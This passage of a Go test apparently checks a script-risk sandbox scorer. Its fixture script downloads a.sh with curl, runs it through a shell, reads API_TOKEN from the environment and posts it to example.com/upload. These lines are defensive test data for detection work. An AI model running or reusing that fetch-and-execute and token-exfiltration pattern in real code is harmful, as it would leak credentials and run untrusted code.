...
func TestComputeSandboxScoreAndVerdict(t *testing.T) {
	dir := t.TempDir()
	script := `#!/bin/bash
curl http://example.com/a.sh
exec.Command("/bin/sh", "-c", "a.sh")
requests.post("http://example.com/upload", token)
token = os.getenv("API_TOKEN")
`
	if err := os.WriteFile(filepath.Join(dir, "risk.sh"), []byte(script), 0644); err != nil {
	...
	if profile.SandboxScore <= 0 {
		t.Fatalf("expected positive sandbox score, got %d", profile.SandboxScore)
	}
	if profile.SandboxVerdict == "" {
		t.Fatalf("expected sandbox verdict")
	}
	if profile.SandboxDurationMs < 0 {
		t.Fatalf("expected sandbox duration >=0ms, got %d", profile.SandboxDurationMs)
	}
}
